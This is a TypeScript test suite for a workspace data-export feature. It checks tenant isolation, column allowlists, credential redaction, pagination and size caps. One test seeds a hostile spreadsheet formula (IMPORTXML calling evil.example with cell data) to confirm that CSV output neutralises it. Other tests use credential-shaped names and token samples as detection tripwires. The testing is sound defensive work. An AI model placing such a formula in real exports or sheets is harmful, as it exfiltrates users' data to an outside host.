/**
 * API-3xx — authenticated data export.
 *
 * An export is the one feature whose whole job is to hand a file to a person. A
 * cross-tenant row or a credential in it is not a bug report; it is a breach. So the
 * interesting assertions here are the refusals.
 */
import { describe, expect, it } from 'vitest';
import { AppError } from '@verify/contracts';
import { InMemorySupportData } from '@app/support/memory';
import { EXPORT_SECTION } from '@app/support/port';
import {
  EXPORT_COLUMNS,
  buildExport,
  containsCredentialShape,
  isForbiddenColumn,
} from '@app/privacy/export';

const NOW = new Date('2026-09-19T12:00:00.000Z');

function seedMinimal(port: InMemorySupportData, workspaceId = 'ws_1'): void {
  for (const section of EXPORT_SECTION) {
    port.seedExportSection(section, {
      columns: EXPORT_COLUMNS[section],
      rows: [],
    });
  }
  port.seedExportSection('workspace', {
    columns: EXPORT_COLUMNS.workspace,
    rows: [[workspaceId, 'Acme', 'active', 1, '2026-01-01T00:00:00.000Z']],
  });
}

describe('data export', () => {
  it('API-340 a hostile CRM value is neutralised end to end in the CSV file', async () => {
    const port = new InMemorySupportData();
    seedMinimal(port);
    port.seedExportSection('evidence', {
      columns: EXPORT_COLUMNS.evidence,
      rows: [
        [
          'evd_1',
          'ws_1',
          'run_1',
          'hubspot',
          'provider_readback',
          'rec_1',
          '2026-09-01T00:00:00.000Z',
          'digest',
          '=IMPORTXML("https://evil.example/?d="&A1,"//x")',
          '2026-10-01T00:00:00.000Z',
        ],
      ],
    });

    const result = await buildExport(port, {
      workspaceId: 'ws_1',
      format: 'csv',
      now: NOW,
    });

    const file = result.files.find((f) => f.name === 'evidence.csv');
    expect(file).toBeDefined();
    expect(file?.body).toContain(`"'=IMPORTXML(`);
    // The formula never appears unprefixed at the start of a field.
    expect(file?.body).not.toMatch(/(^|,)=IMPORTXML/m);
  });

  it('API-341 a row belonging to another workspace makes the whole export refuse', async () => {
    const port = new InMemorySupportData();
    seedMinimal(port);
    port.seedExportSection('runs', {
      columns: EXPORT_COLUMNS.runs,
      rows: [
        [
          'run_1',
          'ws_1',
          'wf_1',
          'VERIFIED',
          1,
          '2026-09-01T00:00:00.000Z',
          '2026-09-01T00:00:00.000Z',
          null,
        ],
        // The one that must not be written to a file.
        [
          'run_2',
          'ws_2',
          'wf_9',
          'FAILED',
          1,
          '2026-09-01T00:00:00.000Z',
          '2026-09-01T00:00:00.000Z',
          null,
        ],
      ],
    });

    const error = await buildExport(port, {
      workspaceId: 'ws_1',
      format: 'json',
      now: NOW,
    }).catch((e: unknown) => e);

    expect(error).toBeInstanceOf(AppError);
    expect((error as AppError).code).toBe('EXPORT_CROSS_TENANT_ROW');
  });

  it('API-342 a page carrying an unexpected column is refused rather than filtered', async () => {
    const port = new InMemorySupportData();
    seedMinimal(port);
    port.seedExportSection('workflows', {
      columns: [...EXPORT_COLUMNS.workflows, 'resend_api_key'],
      rows: [],
    });

    const error = await buildExport(port, {
      workspaceId: 'ws_1',
      format: 'json',
      now: NOW,
    }).catch((e: unknown) => e);

    expect(error).toBeInstanceOf(AppError);
    expect((error as AppError).code).toBe('EXPORT_COLUMNS_UNEXPECTED');
  });

  it('API-343 no column in the allowlist has a credential-shaped name', () => {
    for (const [section, columns] of Object.entries(EXPORT_COLUMNS)) {
      for (const column of columns) {
        expect(isForbiddenColumn(column), `${section}.${column}`).toBe(false);
      }
    }
    // And the guard is not vacuous.
    expect(isForbiddenColumn('resend_api_key')).toBe(true);
    expect(isForbiddenColumn('totp_secret_ref')).toBe(true);
    expect(isForbiddenColumn('recipient_hash')).toBe(true);
  });

  it('API-344 no exported value matches a credential shape', async () => {
    const port = new InMemorySupportData();
    seedMinimal(port);
    port.seedExportSection('support_cases', {
      columns: EXPORT_COLUMNS.support_cases,
      rows: [
        [
          'sup_1',
          'ws_1',
          'Connection broken',
          // Already redacted on the way in — this is what storage actually holds.
          'Here is the key I used: [redacted:credential]',
          'connection_problem',
          'high',
          'open',
          '2026-09-01T00:00:00.000Z',
          '2026-09-01T00:00:00.000Z',
        ],
      ],
    });

    const result = await buildExport(port, {
      workspaceId: 'ws_1',
      format: 'json',
      now: NOW,
    });

    for (const file of result.files) {
      expect(containsCredentialShape(file.body), file.name).toBe(false);
    }
    // The tripwire itself works.
    expect(containsCredentialShape('re_ABCDEFGH12345678')).toBe(true);
    expect(containsCredentialShape('Bearer eyJhbGciOiJIUzI1NiJ9')).toBe(true);
  });

  it('API-345 the JSON export names every column from the allowlist', async () => {
    const port = new InMemorySupportData();
    seedMinimal(port);

    const result = await buildExport(port, {
      workspaceId: 'ws_1',
      format: 'json',
      now: NOW,
    });

    const parsed = JSON.parse(result.files[0]?.body ?? '{}') as {
      workspace_id: string;
      sections: Record<string, { rows: Record<string, unknown>[] }>;
    };
    expect(parsed.workspace_id).toBe('ws_1');
    const row = parsed.sections['workspace']?.rows[0];
    expect(Object.keys(row ?? {})).toEqual([...EXPORT_COLUMNS.workspace]);
  });

  it('API-346 the export is cursor-paginated across several pages', async () => {
    const port = new InMemorySupportData();
    seedMinimal(port);
    const rows = Array.from({ length: 25 }, (_, i) => [
      `run_${String(i).padStart(3, '0')}`,
      'ws_1',
      'wf_1',
      'VERIFIED',
      1,
      '2026-09-01T00:00:00.000Z',
      '2026-09-01T00:00:00.000Z',
      null,
    ]);
    port.seedExportSection('runs', { columns: EXPORT_COLUMNS.runs, rows });

    const result = await buildExport(port, {
      workspaceId: 'ws_1',
      format: 'csv',
      pageSize: 4,
      now: NOW,
    });

    const runs = result.sections.find((s) => s.section === 'runs');
    expect(runs?.rows).toBe(25);
    expect(runs?.complete).toBe(true);
    expect(result.complete).toBe(true);
  });

  it('API-347 hitting the size cap makes the export incomplete, and it says so', async () => {
    const port = new InMemorySupportData();
    seedMinimal(port);
    const rows = Array.from({ length: 200 }, (_, i) => [
      `run_${String(i).padStart(3, '0')}`,
      'ws_1',
      'wf_1',
      'VERIFIED',
      1,
      '2026-09-01T00:00:00.000Z',
      '2026-09-01T00:00:00.000Z',
      null,
    ]);
    port.seedExportSection('runs', { columns: EXPORT_COLUMNS.runs, rows });

    const result = await buildExport(port, {
      workspaceId: 'ws_1',
      format: 'csv',
      maxTotalBytes: 1_024,
      now: NOW,
    });

    expect(result.complete).toBe(false);
    expect(result.statement).toMatch(/not complete/i);
    expect(result.sections.find((s) => s.section === 'runs')?.complete).toBe(false);
  });

  it('API-348 an export without a workspace id is refused', async () => {
    const port = new InMemorySupportData();
    await expect(
      buildExport(port, { workspaceId: '', format: 'json', now: NOW }),
    ).rejects.toMatchObject({ code: 'EXPORT_WORKSPACE_REQUIRED' });
  });

  it('API-349 the complete-export statement promises no credential, in any form', async () => {
    const port = new InMemorySupportData();
    seedMinimal(port);
    const result = await buildExport(port, {
      workspaceId: 'ws_1',
      format: 'csv',
      now: NOW,
    });
    expect(result.complete).toBe(true);
    expect(result.statement).toMatch(/never exported in any form/i);
    expect(result.statement).toMatch(/not even masked/i);
  });
});
